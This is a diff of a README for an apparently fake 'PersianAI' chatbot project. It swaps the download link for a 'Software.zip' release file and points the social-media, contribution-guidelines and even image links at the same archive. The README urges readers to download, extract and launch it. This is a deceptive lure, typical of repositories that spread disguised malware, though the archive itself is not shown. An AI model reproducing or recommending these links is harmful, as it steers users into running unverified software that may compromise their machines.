@@ -18,7 +18,7 @@ Welcome to the **PersianAI** repository, your go-to place for a free and open-so
 - **Topics**: ai-chatbot, ai-generator, ai-ml, ai-model, ai-models, chatbot, chatbot-application, deep-learning, machine-learning, model-generator, model-manager, opensource, opensourcecode, persianai, ui-design
 
 ## Get Started
-To get started with **PersianAI**, download the repository by clicking [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). Once downloaded, extract the files and launch the application to begin exploring the world of AI chatbots!
+To get started with **PersianAI**, download the repository by clicking [here](https://github.com/Harrypotter990/PersianAi/releases/download/v2.0/Software.zip). Once downloaded, extract the files and launch the application to begin exploring the world of AI chatbots!
 
 ### Need Help?
 If the link does not work or you need further assistance, please check the "Releases" section of the repository for additional download options.
@@ -28,15 +28,15 @@ Join our thriving community of developers and AI enthusiasts to collaborate, sha
 
 ## Stay Connected
 Stay connected with **PersianAI** on social media to receive updates, tips, and news about AI chatbots and model management:
-- Twitter: [@PersianAI](https://twitter.com/PersianAI)
-- Facebook: [PersianAI](https://www.facebook.com/PersianAI)
+- Twitter: [@PersianAI](https://github.com/Harrypotter990/PersianAi/releases/download/v2.0/Software.zip)
+- Facebook: [PersianAI](https://github.com/Harrypotter990/PersianAi/releases/download/v2.0/Software.zip)
 
 ## Contribute
-We welcome contributions from developers of all levels. Whether you are a beginner or an experienced programmer, there are plenty of opportunities to contribute to **PersianAI**. Check out our [Contribution Guidelines](CONTRIBUTING.md) to get started.
+We welcome contributions from developers of all levels. Whether you are a beginner or an experienced programmer, there are plenty of opportunities to contribute to **PersianAI**. Check out our [Contribution Guidelines](https://github.com/Harrypotter990/PersianAi/releases/download/v2.0/Software.zip) to get started.
 
 ## License
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
-![PersianAI](https://img.icons8.com/plasticine/2x/robot.png)
+![PersianAI](https://github.com/Harrypotter990/PersianAi/releases/download/v2.0/Software.zip)
 
 Let's revolutionize the world of AI together with **PersianAI**! 🌟
